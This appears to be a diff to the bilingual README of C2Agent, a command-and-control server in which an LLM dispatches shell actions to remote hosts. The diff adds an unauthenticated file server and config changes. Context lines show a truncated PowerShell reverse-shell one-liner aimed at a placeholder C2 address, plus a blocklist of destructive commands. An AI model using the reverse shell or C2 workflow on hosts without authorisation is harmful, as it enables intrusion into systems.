@@ -35,6 +35,7 @@ C2Agent 是一个**控制端**（Go 单文件、纯 Go、无 CGO）。它同时�
 - **三级授权**：`0` N-Auto（全部需授权）、`1` H-Auto（低风险自动）、`2` F-Auto（全部自动）；
   授权通过会重置本轮轮数预算；拒绝则**不下发**该动作并结束本轮。
 - **文件传输**：上传/下载统一落盘 `dl_temp_dir/<basename>`（重名覆盖）。
+- **可选文件服务器**：独立监听端口，无需鉴权，支持目录浏览与大文件 Range 下载；路径穿越请求返回 403。
 - **CLI + Web**：CLI 交互；Web 面板含 Agent 列表、会话列表、文件管理器、授权弹窗、授权模式滑块、深浅主题。
 - **会话韧性**：会话在后台 goroutine 运行，页面刷新/断线不中断，重连后自动重放状态并继续流式接收。
 - **纯 Go、无 CGO**：可交叉编译 Windows / Linux / macOS（amd64/arm64）单文件二进制。
@@ -72,7 +73,7 @@ C2Agent 是一个**控制端**（Go 单文件、纯 Go、无 CGO）。它同时�
 C2Agent/
 ├── design.md                 # 完整设计文档
 ├── go.mod / go.sum           # Go module（c2agent）
-├── config_c2.example.json    # C2 配置示例
+├── config.example.json       # C2 配置示例
 ├── cmd/c2agent/main.go       # 入口：--mode cli|web --config
 ├── internal/
 │   ├── config/               # 配置加载/校验/默认值/目录解析
@@ -84,6 +85,7 @@ C2Agent/
 │   ├── command/              # 动作表（名称/参数/风险/安全检查/工具 schema 来源）
 │   ├── llm/                  # openai-go 客户端 + tools schema
 │   ├── engine/               # 多会话编排、授权、轮数、事件
+│   ├── fileserver/           # 可选静态文件服务器（无鉴权，防路径穿越）
 │   ├── web/                  # net/http API + SSE + 内嵌前端
 │   │   └── ui/index.html
 │   └── cli/                  # 交互式命令行
@@ -155,6 +157,9 @@ python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 -
 ```
 
 > 需要 Python 3.9+；仅依赖标准库，无三方依赖。
+>
+> 配置文件默认读取 `config.json`：相对路径先按当前工作目录解析，再回退到仓库 `remote/` 目录；
+> 显式 `--config` 指定的文件不存在时直接报错。
 
 #### 7.5 Go 受控端
 
@@ -188,12 +193,12 @@ build\build_all.bat     # Windows
 ### 8. 运行
 
 ```bash
-cp config_c2.example.json config_c2.json    # 填写 llm.api_base / api_key / model
+cp config.example.json config.json    # 填写 llm.api_base / api_key / model
 
-# CLI（默认模式）
-./bin/c2agent --config config_c2.json
+# 启动模式由配置文件的 mode 决定（默认 cli）
+./bin/c2agent --config config.json
 # Web 面板：浏览器打开 http://127.0.0.1:8880
-./bin/c2agent --mode web --config config_c2.json
+./bin/c2agent --mode web --config config.json
 ```
 
 **接入受控端 A（Native）**
@@ -220,14 +225,16 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 
 > ⚠️ **`--agent-id` 必须每台受控端唯一**（如 `server-01`、`server-02`）。C2 以 agent_id 为键，同一 id 的新连接会顶掉旧连接（用于断线重连）；若两台机器共用同一 id，二者会互相顶掉并持续重连抖动。
 
-### 9. 配置说明（`config_c2.json`）
+### 9. 配置说明（`config.json`）
 
 | 分区 | 字段 | 说明 |
 | ---- | ---- | ---- |
+| （根） | `mode` | 启动模式 `cli` / `web`（默认 `cli`，非法值回退 `cli`）；命令行 `--mode` 优先级更高 |
 | `llm` | `api_base` / `api_key` / `model` / `temperature` / `stream` / `system_prompt` | LLM 接口；`system_prompt` 中 `{system_name}` 会被替换为目标 OS（提示词中**不出现** agent id/host） |
 | `web` | `listen_host` / `listen_port` | Web 面板监听（默认 `127.0.0.1:8880`） |
 | `native` | `enabled` / `listen_host` / `listen_port` / `auth_token` / `heartbeat_timeout_sec` | 原生协议监听；`enabled=true` 时 `auth_token` 必填且与受控端一致 |
 | `shell` | `enabled` / `listen_host` / `listen_port` / `bot_prefix` | 反弹 Shell 监听；`bot_prefix` 默认 `BOT-` |
+| `fileserver` | `enable` / `listen_host` / `listen_port` / `path` | 可选文件服务器；`path` 空 = 程序同目录下 `fileserver`，非法配置只禁用该功能 |
 | `policy` | `auth_mode` / `round_limit` / `cmd_timeout` / `timeout_action` / `max_sessions_per_agent` / `queue_capacity` | 授权模式、轮数、执行超时、超时策略（`disconnect`/`fail`）、会话上限、队列容量 |
 | `transfer` | `dl_temp_dir` / `ul_temp_dir` | 下载落盘目录（空 = `<cwd>/downloads`）、上传缓冲目录（空 = 系统临时目录） |
 
@@ -267,7 +274,8 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 其后全流量 ChaCha20，每连接的 key 与 nonce 均由握手 nonce 派生（一次一密）：
 `key(dir)=sha256(nonce+token+nonce+dir)`、`nonce(dir)=sha256(token+nonce+token+dir)[:12]`
 （`dir` 区分双向，`0x01`=C2→Agent，`0x02`=Agent→C2），counter 连续自增。
-`read_file` 整文件读取截断 **51200 字符**。
+`read_file` 整文件读取截断 **51200 字符**；行范围最多 **512 行**。
+所有动作的单次输出上限为 **8 MiB**（超出部分截断并附加标记），避免超大输出耗尽内存或超过 32 MiB 协议包上限。
 
 **Shell**：明文单行命令 + `echo __C2AGENT_<hex>__` 定界；C2 探测 OS（`uname` / PowerShell / `sw_vers`）后编号 `BOT-XXX`；
 所有动作转为单条 shell 命令；文件传输由 C2 端循环按偏移分段：受控端只执行「读取指定偏移一段并 base64 回传」或「base64 解码并追加到文件」，两端内存有界，大文件不再受单条命令长度限制。
@@ -278,6 +286,7 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 - **轮数**：`round_limit` 限制单轮「LLM→动作→回灌」次数；**授权通过时清零**（拒绝不清零），任何模式都生效。
 - **拒绝语义**：被拒动作**绝不下发**受控端，作为 tool 结果回灌后**结束本轮**。
 - **指令队列**：每 Agent 一条 FIFO；**排队等待无超时**，**执行中受 `cmd_timeout`**。
+- **输出与写超时**：单次动作输出上限 **8 MiB**，`read_file` 行范围最多 **512 行**；C2 到受控端的单次网络写超时为 **10 秒**，避免对端停止读取时 dispatcher 被永久阻塞。
 - **执行超时语义**（`timeout_action`）：
   - `disconnect`（默认）：断开该 Agent，等待其重连。
   - `fail`：**保留连接**。当前 Job 报超时失败，并**清空该 Agent 的排队指令**；由于受控端上的命令可能仍在运行，C2 在它真正结束前（`Busy`）会拒绝新指令（直接报错、不再下发）。受控端返回后即可正常下发新指令。
@@ -298,6 +307,7 @@ go test ./...
 
 - Native 使用挑战-响应鉴权 + ChaCha20 全流量加密；Shell 端口**无鉴权**，请仅在内网/VPN 使用。
 - Web 面板默认仅监听 `127.0.0.1`；公网部署请加 SSH 隧道或反向代理 + 鉴权。
+- `fileserver` 是**无鉴权**的静态文件服务器，请仅在受信网络/VPN 使用；默认监听 `0.0.0.0`，建议改为具体内网地址或 `127.0.0.1`。
 - 授权模式与安全检查（`rm -rf /`、`format c:`、`mkfs.` 等）用于降低风险，但非生产级防护。
 - 安全检查与授权**仅作用于 LLM 生成的动作**；CLI/Web 中操作员的直连命令与文件操作不受约束（操作员即授权方）。
 - Shell 受控端通过 `uname` / PowerShell / `sw_vers` 探测 OS；纯 `cmd.exe` 且无 PowerShell 的目标会被判为 Unknown 而无法使用。
@@ -326,6 +336,7 @@ Interfaces: **CLI** and a **browser Web panel** (embedded single page, SSE strea
 - **Per-agent linear command queue** — actions/uploads/downloads/direct commands from all sessions are serialized FIFO per agent; results are routed back to the originating session. **Queue wait has no timeout; execution is bounded by `cmd_timeout`.**
 - **Three-level authorization** — `0` N-Auto (all), `1` H-Auto (low-risk auto), `2` F-Auto (none). An approval resets the round budget; a denial **never dispatches** the action and ends the turn.
 - **File transfer** — uploads/downloads land in `dl_temp_dir/<basename>` (overwrite).
+- **Optional file server** — independent listener, no auth, directory browsing and range-based large-file downloads; traversal attempts return 403.
 - **CLI + Web** — agent list, session list, file manager, authorization popup, auth-mode slider, light/dark themes.
 - **Session resilience** — sessions run in background goroutines; page refresh/disconnect does not interrupt them, and a re-attach replays state and resumes the stream.
 - **Pure Go, no CGO** — cross-compiles to Windows / Linux / macOS (amd64/arm64) single binaries.
@@ -365,7 +376,7 @@ fed back to the model for the next round (bounded by `round_limit`).
 C2Agent/
 ├── design.md                 # full design document
 ├── go.mod / go.sum           # Go module (c2agent)
-├── config_c2.example.json    # C2 config example
+├── config.example.json       # C2 config example
 ├── cmd/c2agent/main.go       # entry: --mode cli|web --config
 ├── internal/
 │   ├── config/               # config load/validate/defaults/dir resolution
@@ -377,6 +388,7 @@ C2Agent/
 │   ├── command/              # action table (name/params/risk/safety; tool schema source)
 │   ├── llm/                  # openai-go client + tools schema
 │   ├── engine/               # multi-session orchestration, auth, rounds, events
+│   ├── fileserver/           # optional static file server (no auth, traversal-safe)
 │   ├── web/                  # net/http API + SSE + embedded frontend
 │   │   └── ui/index.html
 │   └── cli/                  # interactive CLI
@@ -448,6 +460,10 @@ python remote/remote-py/main.py --c2-address <C2_IP>:8881 --agent-id server-01 -
 ```
 
 > Requires Python 3.9+; standard library only, no third-party dependencies.
+>
+> The default config file is `config.json`: a relative path is resolved against the current
+> working directory first, then the repository's `remote/` directory; an explicitly supplied
+> `--config` that does not exist is an error.
 
 #### 7.5 Go agent
 
@@ -483,12 +499,12 @@ Outputs land in `dist/`, all **statically compiled, `CGO_ENABLED=0`, no external
 ### 8. Run
 
 ```bash
-cp config_c2.example.json config_c2.json    # fill in llm.api_base / api_key / model
+cp config.example.json config.json    # fill in llm.api_base / api_key / model
 
-# CLI (default mode)
-./bin/c2agent --config config_c2.json
+# The startup mode comes from the config file's `mode` field (default cli)
+./bin/c2agent --config config.json
 # Web panel: open http://127.0.0.1:8880
-./bin/c2agent --mode web --config config_c2.json
+./bin/c2agent --mode web --config config.json
 ```
 
 **Connect a Native agent**
@@ -515,14 +531,16 @@ Registered agents appear as `server-01` (Native) and `BOT-001` (Shell).
 
 > ⚠️ **`--agent-id` must be unique per controlled end** (e.g. `server-01`, `server-02`). The C2 keys agents by id and a new connection with an existing id replaces the old one (intended for reconnects); two hosts sharing one id will repeatedly evict each other.
 
-### 9. Configuration reference (`config_c2.json`)
+### 9. Configuration reference (`config.json`)
 
 | Section | Fields | Notes |
 | ------- | ------ | ----- |
+| (root) | `mode` | Startup mode `cli` / `web` (default `cli`; invalid values fall back to `cli`); `--mode` takes precedence |
 | `llm` | `api_base` / `api_key` / `model` / `temperature` / `stream` / `system_prompt` | LLM endpoint; `{system_name}` in `system_prompt` is replaced with the OS (the prompt reveals **no** agent id/host) |
 | `web` | `listen_host` / `listen_port` | Web panel listener (default `127.0.0.1:8880`) |
 | `native` | `enabled` / `listen_host` / `listen_port` / `auth_token` / `heartbeat_timeout_sec` | Native listener; when `enabled=true`, `auth_token` is required and must match the agent |
 | `shell` | `enabled` / `listen_host` / `listen_port` / `bot_prefix` | Reverse-shell listener; `bot_prefix` defaults to `BOT-` |
+| `fileserver` | `enable` / `listen_host` / `listen_port` / `path` | Optional file server; empty `path` = `<exe dir>/fileserver`; invalid settings only disable this feature |
 | `policy` | `auth_mode` / `round_limit` / `cmd_timeout` / `timeout_action` / `max_sessions_per_agent` / `queue_capacity` | auth mode, rounds, execution timeout, timeout action (`disconnect`/`fail`), session cap, queue depth |
 | `transfer` | `dl_temp_dir` / `ul_temp_dir` | download dir (empty = `<cwd>/downloads`), upload staging dir (empty = system temp) |
 
@@ -563,7 +581,9 @@ Registration: `register(random nonce only)` → `register_response(sha256(nonce+
 connection's key and nonce are derived from the handshake nonce (one-time key+nonce):
 `key(dir)=sha256(nonce+token+nonce+dir)`, `nonce(dir)=sha256(token+nonce+token+dir)[:12]`
 (`dir` separates the directions: `0x01`=C2→Agent, `0x02`=Agent→C2), with a continuous counter.
-Whole-file `read_file` is truncated to **51200 chars**.
+Whole-file `read_file` is truncated to **51200 chars**; a line range is capped at **512 lines**.
+Every action's output is capped at **8 MiB** (truncated with a marker) so oversized output cannot
+exhaust memory or exceed the 32 MiB protocol body limit.
 
 **Shell**: plaintext single-line command framed by `echo __C2AGENT_<hex>__`; the C2 probes the OS
 (`uname` / PowerShell / `sw_vers`) and assigns `BOT-XXX`; every action becomes one shell command;
@@ -597,6 +617,8 @@ and snapshot pending serialization.
 
 - Native uses challenge-response auth + full-stream ChaCha20. The shell listener is **unauthenticated** — use it only on a trusted network/VPN.
 - The Web panel binds to `127.0.0.1` by default; for public exposure add an SSH tunnel or reverse proxy + auth.
+- `fileserver` is an **unauthenticated** static file server; use it only on a trusted network/VPN.
+  It binds to `0.0.0.0` by default; prefer a specific LAN address or `127.0.0.1`.
 - Authorization modes and safety checks (`rm -rf /`, `format c:`, `mkfs.`, ...) reduce risk but are not production-grade protection.
 - Safety checks and authorization apply to **LLM-generated actions only**; an operator's direct commands and file operations from the CLI/Web are not constrained (the operator is the authorizer).
 - Shell bots probe the OS via `uname` / PowerShell / `sw_vers`; a pure `cmd.exe` host without PowerShell is reported as Unknown and unusable.
